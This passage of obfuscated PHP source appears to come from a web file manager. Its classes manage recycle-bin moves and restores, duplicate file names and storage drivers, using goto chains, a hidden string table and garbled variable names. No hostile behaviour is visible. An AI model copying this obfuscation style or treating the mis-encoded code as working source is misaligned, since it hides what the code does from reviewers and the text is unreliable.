array($E¡Áïæ²ê­[543] => 0); if ($FÃÑ£Ã³È != !1) { $D»Î±Ğ¿…·[$E¡Áïæ²ê­[481]] = $FÃÑ£Ã³È; $D»Î±Ğ¿…·[$E¡Áïæ²ê­[395]] = $BÖÔ§Ú¨ø„; } goto e™¬’¶º“’; EŸ¼¼ïïœ›: } public function fileNameExist($fã‚ñù£¡Â, $cî£ÏÂ…ìÅ) { $D•¼À®íâ =& $_SERVER[±á õÁ]; $A‘ºËˆÀ÷… = $this->childList($fã‚ñù£¡Â); foreach ($A‘ºËˆÀ÷… as $D®Ùô„¯Ù‰) { if ($D®Ùô„¯Ù‰[$D•¼À®íâ[38]] == $cî£ÏÂ…ìÅ) { return $D®Ùô„¯Ù‰[$D•¼À®íâ[393]]; } if (strtolower($D®Ùô„¯Ù‰[$D•¼À®íâ[38]]) == strtolower($cî£ÏÂ…ìÅ)) { return $D®Ùô„¯Ù‰[$D•¼À®íâ[393]]; } } return !1; } public function childList($bÆá° ò›) { goto eÃ†êğÚ¤; cÄ—ß¤: $C‘ËÇñ™á’ = array($b¯î°Ô‚‚Ò[486] => intval($bÆá° ò›), $b¯î°Ô‚‚Ò[421] => 0); $fô†ˆîÑ° = $this->where($C‘ËÇñ™á’)->select(); $fô†ˆîÑ° = $fô†ˆîÑ° ? $fô†ˆîÑ° : array(); goto A÷Š ¨…˜; A÷Š ¨…˜: self::$cacheChildList[$fˆšÕÖãá¾] = $fô†ˆîÑ°; foreach ($fô†ˆîÑ° as $dÙˆÏ¾éÊ—) { $fˆšÕÖãá¾ = $b¯î°Ô‚‚Ò[434] . $dÙˆÏ¾éÊ—[$b¯î°Ô‚‚Ò[393]]; self::$cacheSourceInfo[$fˆšÕÖãá¾] = $dÙˆÏ¾éÊ—; } return $fô†ˆîÑ°; goto bÁ³ØæÑä; eÃ†êğÚ¤: $b¯î°Ô‚‚Ò =& $_SERVER[±á õÁ]; $fˆšÕÖãá¾ = $b¯î°Ô‚‚Ò[1890] . $bÆá° ò›; if (isset(self::$cacheChildList[$fˆšÕÖãá¾])) { return self::$cacheChildList[$fˆšÕÖãá¾]; } goto cÄ—ß¤; bÁ³ØæÑä: } public function fileNameAuto($a¯†ÛÁñˆ¡, $f›¸›å•Ë¹, $B†„§ÀÍä = REPEAT_RENAME, $dê´µ´èŞÏ = false) { $FšôÑù¨î =& $_SERVER[±á õÁ]; $bÅ§³Ä¼›“ = $this->childList($a¯†ÛÁñˆ¡); $DöôÕ˜Â×Š = array_to_keyvalue($bÅ§³Ä¼›“, $FšôÑù¨î[43], $FšôÑù¨î[38]); return $this->fileNameAutoGet($DöôÕ˜Â×Š, $f›¸›å•Ë¹, $B†„§ÀÍä, $dê´µ´èŞÏ); } public function fileNameAutoGet($fÌŠÃ¬©™, $E–ÎİÎÚÌ, $EŒ†ĞÈƒ©©, $B èÛìØù) { $b²ˆß‘Óšï =& $_SERVER[±á õÁ]; if ($EŒ†ĞÈƒ©© == REPEAT_REPLACE || !$fÌŠÃ¬©™ || !in_array_not_case($E–ÎİÎÚÌ, $fÌŠÃ¬©™) || $B èÛìØù && $EŒ†ĞÈƒ©© != REPEAT_RENAME_FOLDER) { return $E–ÎİÎÚÌ; } if ($EŒ†ĞÈƒ©© == REPEAT_SKIP) { return !1; } $dÌñª·ãÕ– = $b²ˆß‘Óšï[101] . get_path_ext($E–ÎİÎÚÌ); $dÌñª·ãÕ– = $dÌñª·ãÕ– == $b²ˆß‘Óšï[101] || $B èÛìØù ? $b²ˆß‘Óšï[43] : $dÌñª·ãÕ–; for ($ešÈ‘ãÔ–¿ = 1; $ešÈ‘ãÔ–¿ <= count($fÌŠÃ¬©™) + 1; $ešÈ‘ãÔ–¿++) { $a÷˜°’ ˆ‰ = substr($E–ÎİÎÚÌ, 0, strlen($E–ÎİÎÚÌ) - strlen($dÌñª·ãÕ–)); $b‘Ÿ”²ñİâ = $a÷˜°’ ˆ‰ . "\50{$ešÈ‘ãÔ–¿}\51{$dÌñª·ãÕ–}"; if (!in_array_not_case($b‘Ÿ”²ñİâ, $fÌŠÃ¬©™)) { return $b‘Ÿ”²ñİâ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\x63\145\137\162\x65\x63\x79\x63\x6c\145"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\124\151\155\x65", "\164\x69\155\145", "\151\156\x73\x65\x72\x74", "\146\x75\156\143\164\x69\157\156")); public function listData($cÒÉèˆÉË = false) { $AöÇÅğ‰å =& $_SERVER[±á õÁ]; $cÒÉèˆÉË = $cÒÉèˆÉË ? $cÒÉèˆÉË : USER_ID; $b×ùˆòªĞ‰ = $this->where(array($AöÇÅğ‰å[1455] => $cÒÉèˆÉË))->select(); return array_to_keyvalue($b×ùˆòªĞ‰, $AöÇÅğ‰å[43], $AöÇÅğ‰å[393]); } public function moveToRecycle($F½š†êƒËŒ) { goto f‰È–ëéÚ; CÊÎË±¶™: $this->recycleMove($F½š†êƒËŒ, 1); if ($fŠ‘‰±èî[$d²¦Øèˆº’[394]] == $d²¦Øèˆº’[93]) { $c¦ÊäÈĞì = array($d²¦Øèˆº’[550] => array($d²¦Øèˆº’[508], $fŠ‘‰±èî[$d²¦Øèˆº’[484]] . $F½š†êƒËŒ . $d²¦Øèˆº’[509])); $AÇœë®ùÀœ->where($c¦ÊäÈĞì)->setField($d²¦Øèˆº’[421], 1); } goto eŠ¡ÉŒƒŒ¼; b³¹•¿ƒĞó: if (!$fŠ‘‰±èî || $fŠ‘‰±èî[$d²¦Øèˆº’[421]] == $d²¦Øèˆº’[93]) { return; } $bà…¹£ê™ë = array($d²¦Øèˆº’[407] => $F½š†êƒËŒ, $d²¦Øèˆº’[1455] => USER_ID, $d²¦Øèˆº’[546] => $fŠ‘‰±èî[$d²¦Øèˆº’[395]], $d²¦Øèˆº’[547] => $fŠ‘‰±èî[$d²¦Øèˆº’[481]], $d²¦Øèˆº’[550] => $fŠ‘‰±èî[$d²¦Øèˆº’[484]]); $this->add($bà…¹£ê™ë); goto CÊÎË±¶™; f‰È–ëéÚ: $d²¦Øèˆº’ =& $_SERVER[±á õÁ]; $AÇœë®ùÀœ = Model($d²¦Øèˆº’[1138]); $fŠ‘‰±èî = $AÇœë®ùÀœ->sourceInfo($F½š†êƒËŒ); goto b³¹•¿ƒĞó; eŠ¡ÉŒƒŒ¼: } public function clear() { $this->remove(!1); } public function remove($fã¬‡ˆØì = false) { goto EóñÄ™Ú³; E–÷‰·‚ˆå: foreach ($c™Ô…İ‰÷× as $aªŸ–˜öì±) { $A¡¬Ü¶§À->targetSpaceUpdate($aªŸ–˜öì±[$fÜ©Ä‰Ù’¼[395]], $aªŸ–˜öì±[$fÜ©Ä‰Ù’¼[481]]); } goto döˆÖ¥´ÌÛ; C£ù•Ì²ëµ: $fã¬‡ˆØì = $fã¬‡ˆØì === !1 ? !1 : $fã¬‡ˆØì; $c™Ô…İ‰÷× = array(); foreach ($aãÎ ÜªÜ½ as $A¥‹Ñ—¼–«) { if ($fã¬‡ˆØì != !1 && !in_array($A¥‹Ñ—¼–«, $fã¬‡ˆØì)) { continue; } $dÈ×¹ñë¡— = $A¡¬Ü¶§À->sourceInfo($A¥‹Ñ—¼–«); $A¡¬Ü¶§À->remove($A¥‹Ñ—¼–«, !1); $Eê™ë£·ïæ = $dÈ×¹ñë¡—[$fÜ©Ä‰Ù’¼[395]] . $fÜ©Ä‰Ù’¼[80] . $dÈ×¹ñë¡—[$fÜ©Ä‰Ù’¼[481]]; $c™Ô…İ‰÷×[$Eê™ë£·ïæ] = array($fÜ©Ä‰Ù’¼[546] => $dÈ×¹ñë¡—[$fÜ©Ä‰Ù’¼[395]], $fÜ©Ä‰Ù’¼[481] => $dÈ×¹ñë¡—[$fÜ©Ä‰Ù’¼[481]]); $this->where(array($fÜ©Ä‰Ù’¼[393] => $A¥‹Ñ—¼–«))->delete(); } goto E–÷‰·‚ˆå; EóñÄ™Ú³: $fÜ©Ä‰Ù’¼ =& $_SERVER[±á õÁ]; $A¡¬Ü¶§À = Model($fÜ©Ä‰Ù’¼[1138]); $aãÎ ÜªÜ½ = $this->listData(); goto C£ù•Ì²ëµ; döˆÖ¥´ÌÛ: } public function restore($fø‘Ô¤®‹… = false) { goto b¨õßºß; f¸àˆÔãáğ: $fø‘Ô¤®‹… = $fø‘Ô¤®‹… == !1 ? !1 : $fø‘Ô¤®‹…; if (!$eö×Òº¿ Í) { return !0; } $Ešè‹Ğƒ¸ = array(); goto fÊéÔ¯Ÿ¸; fÊéÔ¯Ÿ¸: foreach ($eö×Òº¿ Í as $fËö÷íêº) { goto b‰ÒŞĞ·ó¾; A˜’¿‡Æ: $Ešè‹Ğƒ¸[] = $DÚÓ„µŠ±‰[$C÷Ø‰…âÅÌ[486]]; if ($DÚÓ„µŠ±‰[$C÷Ø‰…âÅÌ[394]] == $C÷Ø‰…âÅÌ[93]) { $Ešè‹Ğƒ¸[] = $fËö÷íêº; } $Fø‚äÒÎº¤->lockMoveEnd($fËö÷íêº); goto C‘Š…æÈ¢†; b‰ÒŞĞ·ó¾: if ($fø‘Ô¤®‹… != !1 && !in_array($fËö÷íêº, $fø‘Ô¤®‹…)) { continue; } $DÚÓ„µŠ±‰ = $Fø‚äÒÎº¤->sourceInfo($fËö÷íêº); $Aô…–‹®ó = $Fø‚äÒÎº¤->sourceInfo($DÚÓ„µŠ±‰[$C÷Ø‰…âÅÌ[486]]); goto AßÈ­È¼¼»; c¯×™¹çß£: if ($DÚÓ„µŠ±‰[$C÷Ø‰…âÅÌ[394]] == $C÷Ø‰…âÅÌ[93]) { $AÇ‡¿”×®© = array($C÷Ø‰…âÅÌ[550] => array($C÷Ø‰…âÅÌ[508], $DÚÓ„µŠ±‰[$C÷Ø‰…âÅÌ[484]] . $fËö÷íêº . $C÷Ø‰…âÅÌ[509])); $Fø‚äÒÎº¤->where($AÇ‡¿”×®©)->setField($C÷Ø‰…âÅÌ[421], 0); $this->restoreFolderChildren($fËö÷íêº, $eö×Òº¿ Í); } $this->where(array($C÷Ø‰…âÅÌ[393] => $fËö÷íêº))->delete(); $Fø‚äÒÎº¤->folderSizeReset($DÚÓ„µŠ±‰[$C÷Ø‰…âÅÌ[486]]); goto A˜’¿‡Æ; AßÈ­È¼¼»: if ($Aô…–‹®ó[$C÷Ø‰…âÅÌ[421]] == $C÷Ø‰…âÅÌ[93]) { continue; } $Fø‚äÒÎº¤->lockMoveStart($fËö÷íêº); $this->recycleMove($fËö÷íêº, 0); goto c¯×™¹çß£; C‘Š…æÈ¢†: } $Fø‚äÒÎº¤->updateModifyTime($Ešè‹Ğƒ¸); goto B¼Ê¤äö‘ê; b¨õßºß: $C÷Ø‰…âÅÌ =& $_SERVER[±á õÁ]; $Fø‚äÒÎº¤ = Model($C÷Ø‰…âÅÌ[1138]); $eö×Òº¿ Í = $this->listData(); goto f¸àˆÔãáğ; B¼Ê¤äö‘ê: } private function restoreFolderChildren($b¹Ê‹Øİî, $A±âËŒ¥†) { goto D®›Æ‰çÀ¶; D®›Æ‰çÀ¶: $C¾Ÿµ¸–ƒ =& $_SERVER[±á õÁ]; $däÉÕ¸·°ï = Model($C¾Ÿµ¸–ƒ[1138]); $B‰Ä£Ï³ = array($C¾Ÿµ¸–ƒ[393] => array($C¾Ÿµ¸–ƒ[7], array())); goto DŠç–Áòç¬; Eİ”êê×‡: $B‰Ä£Ï³[$C¾Ÿµ¸–ƒ[393]][1] = array_unique($B‰Ä£Ï³[$C¾Ÿµ¸–ƒ[393]][1]); $B‰Ä£Ï³[$C¾Ÿµ¸–ƒ[930]] = $C¾Ÿµ¸–ƒ[1708]; $däÉÕ¸·°ï->where($B‰Ä£Ï³)->setField($C¾Ÿµ¸–ƒ[421], 1); goto Eğ«Çù²Ä; DŠç–Áòç¬: foreach ($A±âËŒ¥† as $d¡¥÷×Ù¥Ñ) { if ($d¡¥÷×Ù¥Ñ == $b¹Ê‹Øİî) { continue; } if (!$däÉÕ¸·°ï->isParentOf($b¹Ê‹Øİî, $d¡¥÷×Ù¥Ñ)) { continue; } $Eá¬Şæ×¸¸ = $däÉÕ¸·°ï->sourceInfo($d¡¥÷×Ù¥Ñ); if ($Eá¬Şæ×¸¸[$C¾Ÿµ¸–ƒ[394]] == $C¾Ÿµ¸–ƒ[93]) { $B‰Ä£Ï³[] = array($C¾Ÿµ¸–ƒ[550] => array($C¾Ÿµ¸–ƒ[508], $Eá¬Şæ×¸¸[$C¾Ÿµ¸–ƒ[484]] . $d¡¥÷×Ù¥Ñ . $C¾Ÿµ¸–ƒ[509])); } else { $B‰Ä£Ï³[$C¾Ÿµ¸–ƒ[393]][1][] = $d¡¥÷×Ù¥Ñ; } } if (!$B‰Ä£Ï³[$C¾Ÿµ¸–ƒ[393]][1]) { unset($B‰Ä£Ï³[$C¾Ÿµ¸–ƒ[393]]); } if (!$B‰Ä£Ï³) { return; } goto Eİ”êê×‡; Eğ«Çù²Ä: } private function recycleMove($Bªİƒ³™‘©, $EÒŒĞÇ¹ÆŠ = 1) { $Eëäğ ‰Ò¶ =& $_SERVER[±á õÁ]; $dÍÁÈæ¡¤ = Model($Eëäğ ‰Ò¶[1138]); $dÙºÜà‚Êë = Model($Eëäğ ‰Ò¶[1912]); $B¥âÆÓ÷–ë = array($Eëäğ ‰Ò¶[393] => $Bªİƒ³™‘©); if ($EÒŒĞÇ¹ÆŠ) { $dÍÁÈæ¡¤->where($B¥âÆÓ÷–ë)->setField($Eëäğ ‰Ò¶[421], 1); $dÙºÜà‚Êë->eventRecycle($Bªİƒ³™‘©, $Eëäğ ‰Ò¶[1913]); } else { $c½èèïçˆŒ = $dÍÁÈæ¡¤->where($B¥âÆÓ÷–ë)->find(); $b¥×øŞ¾ğ = $c½èèïçˆŒ[$Eëäğ ‰Ò¶[394]] == $Eëäğ ‰Ò¶[93]; $Eø«·ÕÌ§¥ = $dÍÁÈæ¡¤->fileNameAuto($c½èèïçˆŒ[$Eëäğ ‰Ò¶[486]], $c½èèïçˆŒ[$Eëäğ ‰Ò¶[38]], REPEAT_RENAME_FOLDER, $b¥×øŞ¾ğ); if ($Eø«·ÕÌ§¥ != $c½èèïçˆŒ[$Eëäğ ‰Ò¶[38]]) { $dÍÁÈæ¡¤->rename($Bªİƒ³™‘©, $Eø«·ÕÌ§¥); } $dÍÁÈæ¡¤->where($B¥âÆÓ÷–ë)->setField($Eëäğ ‰Ò¶[421], 0); $dÙºÜà‚Êë->eventRecycle($Bªİƒ³™‘©, $Eëäğ ‰Ò¶[1914]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\163\x74\x6f\x72\141\147\145\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\163\x69\172\x65\115\141\170", "\x73\x79\x73\x74\145\155", "\x64\145\146\141\x75\x6c\164", "\144\162\x69\166\145\x72", "\143\x6f\156\x66\151\x67"); public function listData($dšÈ¥ÒÎ’™ = false, $A¡¦Ø¬£ø = "\x6d\157\x64\151\x66\171\124\x69\x6d\145", $AÕæ°À› = false) { goto f‹¤¡£±“½; c£œöñ¶¿Ç: return $B«ô™ÓÂß‚; goto døÃöù°ø¢; a¹“•ˆçÃÀ: foreach ($B«ô™ÓÂß‚ as $f ‡ÖÑ¼ã· => $EÒ…ªàÄ‚Ã) { unset($B«ô™ÓÂß‚[$f ‡ÖÑ¼ã·][$eí‡éøï[6]]); $B«ô™ÓÂß‚[$f ‡ÖÑ¼ã·][$eí‡éøï[1607]] = 0; } $b“³ŸáÓÏ = array_to_keyvalue($B«ô™ÓÂß‚, $eí‡éøï[43], $eí‡éøï[391]); $this->_listAppendSize($B«ô™ÓÂß‚, $b“³ŸáÓÏ); goto c£œöñ¶¿Ç; f‹¤¡£±“½: $eí‡éøï =& $_SERVER[±á õÁ]; $B«ô™ÓÂß‚ = parent::listData($dšÈ¥ÒÎ’™, $A¡¦Ø¬£ø, $AÕæ°À›); if ($dšÈ¥ÒÎ’™) { return $B«ô™ÓÂß‚; } goto a¹“•ˆçÃÀ; døÃöù°ø¢: } public function _listAppendSize(&$CøİÆ•ŞØ, $f‰ÂÍ¶™¼™) { $cóóğ‹÷²ğ =& $_SERVER[±á õÁ]; if (!$f‰ÂÍ¶™¼™) { return; } $D‚á†·Ó¤µ = $cóóğ‹÷²ğ[1915] . implode($cóóğ‹÷²ğ[57], $f‰ÂÍ¶™¼™) . $cóóğ‹÷²ğ[1916]; $BÏîĞÉ˜‚‚ = Model($cóóğ‹÷²ğ[743])->query($D‚á†·Ó¤µ); $BÏîĞÉ˜‚‚ = array_to_keyvalue($BÏîĞÉ˜‚‚, $cóóğ‹÷²ğ[391], $cóóğ‹÷²ğ[87]); foreach ($CøİÆ•ŞØ as $bÛ‘‘Ÿ÷ => $C©ÆÒƒŸ‚ƒ) { $CøİÆ•ŞØ[$bÛ‘‘Ÿ÷][$cóóğ‹÷²ğ[1607]] = isset($BÏîĞÉ˜‚‚[$C©ÆÒƒŸ‚ƒ[$cóóğ‹÷²ğ[391]]]) ? $BÏîĞÉ˜‚‚[$C©ÆÒƒŸ‚ƒ[$cóóğ‹÷²ğ[391]]] : 0; } } public function getConfig($F˜¸’—òªˆ) { $C¯¬°ÇÔß = parent::listData($F˜¸’—òªˆ); return json_decode($C¯¬°ÇÔß[$_SERVER[±á õÁ][6]], !0); } public function update($Eš£ê¼ù«, $c¼¹ÚÖÁµ) { goto bîáŸ¹…ø; e–‡Â‹Æˆ: if (isset($a‹ÛÏ±ì‚[$D¡Éö‚¾¢]) && $a‹ÛÏ±ì‚[$D¡Éö‚¾¢][$cÔ‡‘â‹¶Ê[391]] != $Eš£ê¼ù«) { return !1; } if (isset($c¼¹ÚÖÁµ[$cÔ‡‘â‹¶Ê[1917]]) && $c¼¹ÚÖÁµ[$cÔ‡‘â‹¶Ê[1917]] == $cÔ‡‘â‹¶Ê[93]) { $this->checkConfig($c¼¹ÚÖÁµ); } unset($c¼¹ÚÖÁµ[$cÔ‡‘â‹¶Ê[1917]]); goto aÃ­ÈÌ¦«Ù; bîáŸ¹…ø: $cÔ‡‘â‹¶Ê =& $_SERVER[±á õÁ]; $D¡Éö‚¾¢ = $c¼¹ÚÖÁµ[$cÔ‡‘â‹¶Ê[38]]; $a‹ÛÏ±ì‚ = array_to_keyvalue(parent::listData(), $cÔ‡‘â‹¶Ê[38]); goto e–‡Â‹Æˆ; aÃ­ÈÌ¦«Ù: $BŞÉ½Ø˜æÏ = parent::update($Eš£ê¼ù«, $c¼¹ÚÖÁµ); if ($BŞÉ½Ø˜æÏ && $c¼¹ÚÖÁµ[$cÔ‡‘â‹¶Ê[44]]) { foreach ($a‹ÛÏ±ì‚ as $CõÏÂ÷¬¬) { if ($CõÏÂ÷¬¬[$cÔ‡‘â‹¶Ê[44]] && $CõÏÂ÷¬¬[$cÔ‡‘â‹¶Ê[391]] != $Eš£ê¼ù«) { parent::update($CõÏÂ÷¬¬[$cÔ‡‘â‹¶Ê[391]], array($cÔ‡‘â‹¶Ê[44] => 0)); } } } return $BŞÉ½Ø˜æÏ; goto DÇÁó—±; DÇÁó—±: } public function add($DË«†˜ºº—) { goto aàã¡ïÛô; aàã¡ïÛô: $C£ôäÁ‚ÇÚ =& $_SERVER[±á õÁ]; $b‡ÈÈîŸÔ = array_to_keyvalue(parent::listData(), $C£ôäÁ‚ÇÚ[38]); if (isset($b‡ÈÈîŸÔ[$DË«†˜ºº—[$C£ôäÁ‚ÇÚ[38]]])) { return !1; } goto cåî¼Ãñ¾¥; cåî¼Ãñ¾¥: $this->checkConfig($DË«†˜ºº—); $fáƒŠÔ‹¾ë = parent::insert($DË«†˜ºº—); if ($fáƒŠÔ‹¾ë && $DË«†˜ºº—[$C£ôäÁ‚ÇÚ[44]]) { foreach ($b‡ÈÈîŸÔ as $eÎÕòñ) { if ($eÎÕòñ[$C£ôäÁ‚ÇÚ[44]]) { parent::update($eÎÕòñ[$C£ôäÁ‚ÇÚ[391]], array($C£ôäÁ‚ÇÚ[44] => 0)); } } } goto E»äôÃ·éå; E»äôÃ·éå: return $fáƒŠÔ‹¾ë; goto AİâÈ©™à; AİâÈ©™à: } public function checkConfig(&$EÛ™ö‘Ò) { goto c½ÁŸèĞò; C»Ç´¬ÉÙ: $EÛ™ö‘Ò[$C÷ĞÌàé“ó[6]] = json_encode($CÊ¶ç†îãö); $EÛ™ö‘Ò[$C÷ĞÌàé“ó[100]] = $aôÚŒòéñŠ; return !0; goto Dµ‰À‡î³±; E‚ñš„ Ì: foreach ($CÊ¶ç†îãö as $C«¹åøĞ°Î => $e‰ö¯‚³—) { $CÊ¶ç†îãö[$C«¹åøĞ°Î] = trim($e‰ö¯‚³—); } $CÊ¶ç†îãö[$C÷ĞÌàé“ó[1918]] = rand_string(6); $aÖà‡Úó¦á = $GLOBALS[$C÷ĞÌàé“ó[6]][$C÷ĞÌàé“ó[94]][$C÷ĞÌàé“ó[777]]; goto Eî¢ÛÓ“Éƒ; c½ÁŸèĞò: $C÷ĞÌàé“ó =& $_SERVER[±á õÁ]; $CÚ·…™¡Ñ§ = strtolower($EÛ™ö‘Ò[$C÷ĞÌàé“ó[100]]); $CÊ¶ç†îãö = json_decode($EÛ™ö‘Ò[$C÷ĞÌàé“ó[6]], !0); goto E‚ñš„ Ì; Eî¢ÛÓ“Éƒ: $aôÚŒòéñŠ = isset($aÖà‡Úó¦á[$CÚ·…™¡Ñ§]) ? $aÖà‡Úó¦á[$CÚ·…™¡Ñ§] : ucfirst($CÚ·…™¡Ñ§); $DëíôïÂÏº = $C÷ĞÌàé“ó[81] . $aôÚŒòéñŠ; if (!$aôÚŒòéñŠ || !class_exists($DëíôïÂÏº)) { write_log(array($C÷ĞÌàé“ó[1919], $EÛ™ö‘Ò, get_caller_info()), $C÷ĞÌàé“ó[1920]); show_json(LNG($C÷ĞÌàé“ó[1921]), !1, $EÛ™ö‘Ò); } goto bğ·…‰Å‡—; bğ·…‰Å‡—: $DÅµêÜÂÆÏ = new $DëíôïÂÏº($CÊ¶ç†îãö); if (in_array($CÚ·…™¡Ñ§, $DÅµêÜÂÆÏ->objectDriver)) { if (!$DÅµêÜÂÆÏ->isBucketCors() && !$DÅµêÜÂÆÏ->setBucketCors()) { $a†…œ„…ÀÏ = LNG($C÷ĞÌàé“ó[1922]); $a†…œ„…ÀÏ .= $C÷ĞÌàé“ó[1923] . LNG($C÷ĞÌàé“ó[1924]); show_json($a†…œ„…ÀÏ, !1); } } $f«î¾óÅÏ„ = rtrim($CÊ¶ç†îãö[$C÷ĞÌàé“ó[1046]], $C÷ĞÌàé“ó[8]) . $C÷ĞÌàé“ó[8]; goto cÊÉ’ô«ç“; cÊÉ’ô«ç“: $BÛÉ¾ŒëŠ = $DÅµêÜÂÆÏ->getPath($f«î¾óÅÏ„ . $C÷ĞÌàé“ó[1925]); if (!$DÅµêÜÂÆÏ->mkfile($BÛÉ¾ŒëŠ)) { show_json(LNG($C÷ĞÌàé“ó[1922]), !1); } $CÊ¶ç†îãö[$C÷ĞÌàé“ó[1046]] = $f«î¾óÅÏ„; goto C»Ç´¬ÉÙ; Dµ‰À‡î³±: } public function driverListSystem() { $fà„ƒÔĞõ™ =& $_SERVER[±á õÁ]; $C¸£­ßÁÀ = parent::listData(); $dßªµÂÛŒ® = array(); foreach ($C¸£­ßÁÀ as $E§¸Æ¦­î) { unset($E§¸Æ¦­î[$fà„ƒÔĞõ™[200]], $E§¸Æ¦­î[$fà„ƒÔĞõ™[117]]); $E§¸Æ¦­î[$fà„ƒÔĞõ™[6]] = json_decode($E§¸Æ¦­î[$fà„ƒÔĞõ™[6]], !0); $dßªµÂÛŒ®[] = $E§¸Æ¦­î; } return $dßªµÂÛŒ®; } public function defaultDriver() { $f¸Ø°³²²© =& $_SERVER[±á õÁ]; $Fä‡ÏÒ‰å = parent::listData(); $A‰²ƒŞĞ™ = array_filter_by_field($Fä‡ÏÒ‰å, $f¸Ø°³²²©[44], 1); $A‰²ƒŞĞ™ = $A‰²ƒŞĞ™[0]; if ($A‰²ƒŞĞ™) { $A‰²ƒŞĞ™[$f¸Ø°³²²©[6]] = json_decode($A‰²ƒŞĞ™[$f¸Ø°³²²©[6]], !0); } return $A‰²ƒŞĞ™; } public function driverInfo($bºâÆ³®…±) { $F¬ó„¢”ø =& $_SERVER[±á õÁ]; $DÕÊÍÆ…ºê = array_to_keyvalue(parent::listData(), $F¬ó„¢”ø[391]); if (!isset($DÕÊÍÆ…ºê[$bºâÆ³®…±])) { return !1; } $dë…Ü‘¢˜ = $DÕÊÍÆ…ºê[$bºâÆ³®…±]; $dë…Ü‘¢˜[$F¬ó„¢”ø[6]] = json_decode($dë…Ü‘¢˜[$F¬ó„¢”ø[6]], !0); return $dë…Ü‘¢˜; } public function remove($Cƒî‚óÚ¢‚) { $this->removeShareItems($Cƒî‚óÚ¢‚); return parent::remove($Cƒî‚óÚ¢‚); } public function removeWithFile($c¿¸¢ŸÓ±…, $eõêÛ’„Ñ‘) { goto aõñí–ñ¯; Bó¦±Š’‹¸: if (!$fë¼ÃòÁ„Ô) { $Cø‚ÕÉá->stop($Bì®âÌ—À); return !1; } $Cø‚ÕÉá->end(); if ($eõêÛ’„Ñ‘ == $e”îê©¼Ş›[1587]) { $this->remove($c¿¸¢ŸÓ±…); } goto FŠÓÏğ¤ƒ†; f¹êİô„…¦: $D„…§†¡‚À = "\173\x69\x6f\72{$A¾‚Í ÒÆ}\175\57"; $fë¼ÃòÁ„Ô = !0; $F‘ŞÔö†ğ = array(); goto DåÈ”Œ·ì§; DåÈ”Œ·ì§: $cœæËê ™ = Model($e”îê©¼Ş›[181])->where($Dëìğ›İõÉ)->field($e”îê©¼Ş›[1928])->select(); foreach ($cœæËê ™ as $b¾Ì´øÒ) { goto B’õĞëš°Ì; eÈ©Ç‡Ì»¼: if (IO::exist($dª¢”¨Ñµ§)) { $Cø‚ÕÉá->updateFileEnd($b¾Ì´øÒ[$e”îê©¼Ş›[38]], $b¾Ì´øÒ[$e”îê©¼Ş›[87]]); continue; } if (!IO::move($cËì†Åù¦·, get_path_father($dª¢”¨Ñµ§))) { $fë¼ÃòÁ„Ô = !1; break; } $Dëìğ›İõÉ = array($e”îê©¼Ş›[443] => $b¾Ì´øÒ[$e”îê©¼Ş›[443]]); goto D¬ÆöÔ§©«; D¬ÆöÔ§©«: $bÒ•Û´·©Û = array($e”îê©¼Ş›[768] => $A¾‚Í ÒÆ, $e”îê©¼Ş›[85] => $dª¢”¨Ñµ§); Model($e”îê©¼Ş›[181])->where($Dëìğ›İõÉ)->save($bÒ•Û´·©Û); goto D¢×ƒâÆáƒ; B’õĞëš°Ì: $cËì†Åù¦· = $b¾Ì´øÒ[$e”îê©¼Ş›[85]]; $dª¢”¨Ñµ§ = $D„…§†¡‚À . str_replace("\x7b\x69\157\72{$c¿¸¢ŸÓ±…}\175\57", $e”îê©¼Ş›[43], $cËì†Åù¦·); if (!IO::exist($cËì†Åù¦·)) { $F‘ŞÔö†ğ[] = $b¾Ì´øÒ[$e”îê©¼Ş›[443]]; $Cø‚ÕÉá->updateFileEnd($b¾Ì´øÒ[$e”îê©¼Ş›[38]], $b¾Ì´øÒ[$e”îê©¼Ş›[87]]); continue; } goto eÈ©Ç‡Ì»¼; D¢×ƒâÆáƒ: } $this->removeByFileID($F‘ŞÔö†ğ); goto Bó¦±Š’‹¸; cï÷˜«ƒç™: $b¿‚¬º‘÷ = Model($e”îê©¼Ş›[446])->where($Dëìğ›İõÉ)->sum($e”îê©¼Ş›[87]); $Bì®âÌ—À = $eõêÛ’„Ñ‘ . $e”îê©¼Ş›[1926] . $c¿¸¢ŸÓ±…; $Cø‚ÕÉá = new TaskFileTransfer($Bì®âÌ—À, $e”îê©¼Ş›[1920], $C°ŒÄ²¡ì, LNG($e”îê©¼Ş›[1927]) . "\x28{$c¿¸¢ŸÓ±…}\x29"); goto d‡ëÆÏæÉ; aõñí–ñ¯: $e”îê©¼Ş› =& $_SERVER[±á õÁ]; $Dëìğ›İõÉ = array($e”îê©¼Ş›[768] => $c¿¸¢ŸÓ±…); $C°ŒÄ²¡ì = Model($e”îê©¼Ş›[446])->where($Dëìğ›İõÉ)->count(); goto cï÷˜«ƒç™; d‡ëÆÏæÉ: $Cø‚ÕÉá->task[$e”îê©¼Ş›[723]] = (double) $b¿‚¬º‘÷; $b‚µø²ÙÌğ = KodIO::defaultDriver(); $A¾‚Í ÒÆ = $b‚µø²ÙÌğ[$e”îê©¼Ş›[391]]; goto f¹êİô„…¦; FŠÓÏğ¤ƒ†: } public function progress($eöìåĞã©Æ, $AªÚ™§¹¹ª) { return Task::get($AªÚ™§¹¹ª . $_SERVER[±á õÁ][1926] . $eöìåĞã©Æ); } private function removeByFileID($f„‘œÄÄ— = array()) { goto f’ËÃì¨ºæ; CœªôÖßâ: $BŠñø¨ìÆÈ = Model($fˆ½ËªíÉÔ[1138])->where($dˆ›ØêÏ«)->field($fˆ½ËªíÉÔ[393])->select(); if (!$BŠñø¨ìÆÈ) { return; } $BŠñø¨ìÆÈ = array_to_keyvalue($BŠñø¨ìÆÈ, $fˆ½ËªíÉÔ[43], $fˆ½ËªíÉÔ[393]); goto A—Ä¢Îã»Æ; A—Ä¢Îã»Æ: foreach ($BŠñø¨ìÆÈ as $EÉ¸‹Ü¿ÒÄ) { Model($fˆ½ËªíÉÔ[406])->removeNow($EÉ¸‹Ü¿ÒÄ, !1); } goto dœó†£ÜË¼; f’ËÃì¨ºæ: $fˆ½ËªíÉÔ =& $_SERVER[±á õÁ]; if (empty($f„‘œÄÄ—)) { return; } $dˆ›ØêÏ« = array($fˆ½ËªíÉÔ[443] => 